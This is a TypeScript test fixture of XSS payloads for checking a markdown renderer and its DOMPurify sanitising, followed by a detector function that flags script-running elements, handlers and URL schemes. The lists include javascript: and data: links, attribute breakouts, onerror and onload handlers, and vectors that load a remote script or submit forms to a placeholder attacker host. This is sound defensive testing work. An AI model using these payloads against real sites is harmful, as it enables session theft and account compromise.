// Markdown that tries to get a script into the page, for every path that
// puts rendered markdown there: md() (lib/markdown.ts), and DOMPurify's in
// Viewers.tsx and Conversation.tsx.

// Links to anywhere but the web.
export const HREFS = [
  "javascript:alert(1)",
  "JaVaScRiPt:alert(1)",
  " javascript:alert(1)",
  "java\tscript:alert(1)",
  "&#106;avascript:alert(1)",
  "&#x6A;avascript:alert(1)",
  "javascript&colon;alert(1)",
  "vbscript:msgbox(1)",
  "data:text/html,<script>alert(1)</script>",
  "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
  "file:///etc/passwd",
  "//evil.example",
  "/local",
  "#top",
  "http:evil",
  "mailto:a@b.example",
];

// A link's href and title breaking out of the attribute.
export const BREAKOUTS = [
  '[x](http://a.example"onmouseover="alert(1))',
  "[x](http://a.example'onmouseover='alert(1))",
  '[x](<http://a.example/" onclick="alert(1)>)',
  '[x](http://a.example "t\\" onclick=\\"alert(1)")',
  "[x](http://a.example 'it\\'s' )",
  '[x][r]\n\n[r]: http://a.example "t\\" onclick=x"',
  '<http://a.example/"onclick=alert(1)>',
  'www.a.example/"onclick=alert(1)',
  "https://a.example/<script>alert(1)</script>",
  "[x](http://a.example&#34;onclick=alert(1))",
  "[x](http://a.example&quot;onclick=alert(1))",
  "[x](http://a.example/%22onclick=alert(1))",
];

// Raw HTML, alone and inside markdown.
export const RAW_HTML = [
  "<script>alert(1)</script>",
  "<SCRIPT SRC=//evil.example/x.js></SCRIPT>",
  "<iframe src=javascript:alert(1)></iframe>",
  "<style>body{display:none}</style>",
  "<img src=x onerror=alert(1)>",
  "a <img src=x onerror=alert(1)> b",
  "<svg onload=alert(1)>",
  "<svg><script>alert(1)</script></svg>",
  "<math><mi xlink:href=javascript:alert(1)>x</mi></math>",
  '<a href="javascript:alert(1)">x</a>',
  "<details open ontoggle=alert(1)>",
  "<div>\n<script>alert(1)</script>\n</div>",
  "Text\n<div onclick=alert(1)>\n\nmore\n</div>",
  "<!-- x --><b>",
  "<![CDATA[<script>alert(1)</script>]]>",
  "<?php echo 1 ?>",
  "<img src=x onerror=alert(1)",
  "<a href=x",
  "<",
  "<<script>>",
  "</p><script>",
  "<body onload=alert(1)>",
  "<object data=x>",
  "<embed src=x>",
  "<base href=//evil.example>",
  "<meta http-equiv=refresh content=0;url=//evil.example>",
  "<form action=//evil.example><input name=p></form>",
  "<button formaction=//evil.example>x</button>",
  "<input form=f formaction=//evil.example type=submit>",
  '<div style="position:fixed;inset:0;z-index:9">x</div>',
  '<p style="background:url(//evil.example/x)">x</p>',
  "<textarea><script>",
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
  "<template><script>alert(1)</script></template>",
  "> <style>*{}</style>",
  "- <img src=x onerror=1>",
  "| <img src=x onerror=1> | b |\n|---|---|\n| c | <script>d</script> |",
  "# <i onclick=x>h</i>",
  "*<b onclick=x>*",
  "[<img src=x onerror=1>](http://a.example)",
  "[a](http://a.example)<img src=x onerror=1>",
  "```\n</code></pre><script>alert(1)</script>\n```",
  '```"><script>alert(1)</script>\nx\n```',
  "    <script>alert(1)</script>",
  "`</code><script>`",
];

// What follows an inline tag marked takes as raw HTML up to its end tag.
export const INLINE_OPENERS = ["<script>", "<pre>", "<code>", "<kbd>", "<SCRIPT>", "<pre class=x>"];
export const afterOpener = (open: string) => [`a ${open} b <img src=x onerror=alert(1)//`, `a ${open} <svg/onload=alert(1)`, `a ${open} <!-- x`];

export const IMAGES = [
  "![x](javascript:alert(1))",
  '![x" onerror="alert(1)](http://a.example/x.png)',
  "![<script>](x)",
  '![a](x "t" onerror=alert(1))',
  "[![a](i.png)](http://a.example)",
];

export const ESCAPED = ["&lt;script&gt;", "&#60;script&#62;", "&#x3C;script&#x3E;", "\\<script>", "&amp;lt;script&amp;gt;"];

// Every one of them, for a path that is checked the same way for all.
export const VECTORS = [
  ...HREFS.map((href) => `[x](${href})`),
  ...HREFS.map((href) => `[x][r]\n\n[r]: ${href}`),
  ...HREFS.map((href) => `<${href}>`),
  ...BREAKOUTS,
  ...RAW_HTML,
  ...INLINE_OPENERS.flatMap(afterOpener),
  ...IMAGES,
  ...ESCAPED,
];

// Markdown made of the pieces above and random text, run together.
export const PIECES = [
  "<script>", "</script>", "<img src=x onerror=alert(1)>", "<svg onload=x>", "<a href=", "javascript:", "JAVASCRIPT:", "data:text/html,", "vbscript:",
  "http://a.example", "https://a.example/", "www.a.example", "[", "]", "(", ")", "![", "<", ">", '"', "'", "`", "```", "\n", "\n\n", "    ", "- ", "> ", "# ",
  "| a |", "|---|", "*", "**", "_", "~~", "\\", "&", "&#", "&#106;", "&quot;", "&lt;", ";", ":", "=", " on", "onclick=", "/", "<!--", "-->", "[r]: ", "1. ",
];

// What in a sanitised tree could run something: an element that runs or
// loads a document, an on* attribute, or a URL with a scheme that runs,
// anywhere a URL goes; or reach past where it's drawn: a <style> (the
// whole page's), a style attribute (a box over the page) or a form and
// what submits one. The problems found; none when it's safe.
const RUNS = new Set(["script", "iframe", "frame", "frameset", "object", "embed", "applet", "base", "meta", "link", "portal", "style", "form"]);
const URL_ATTRS = new Set(["href", "src", "action", "formaction", "xlink:href", "data", "poster", "background", "ping", "srcset", "lowsrc", "dynsrc", "cite", "longdesc"]);
export function executable(root: Element): string[] {
  const out: string[] = [];
  const walk = (el: Element) => {
    const tag = el.tagName.toLowerCase();
    if (RUNS.has(tag)) out.push(`<${tag}>`);
    for (const { name, value } of el.attributes) {
      const n = name.toLowerCase();
      if (n.startsWith("on")) out.push(`${n} on <${tag}>`);
      if (n === "srcdoc") out.push(`srcdoc on <${tag}>`);
      if (n === "style" || n === "form" || n === "formaction") out.push(`${n}=${value} on <${tag}>`);
      // What the browser would make of it: control characters and spaces in
      // a scheme are dropped.
      const url = value.replace(/[\u0000- \u007f-\u009f]/g, "").toLowerCase();
      if (URL_ATTRS.has(n) && /^(javascript|vbscript|data:text\/html|data:image\/svg|data:application)/.test(url)) out.push(`${n}=${value} on <${tag}>`);
    }
    // A template's content is a fragment of its own.
    if (el instanceof HTMLTemplateElement) for (const c of el.content.children) walk(c);
    for (const c of el.children) walk(c);
  };
  for (const c of root.children) walk(c);
  return out;
}
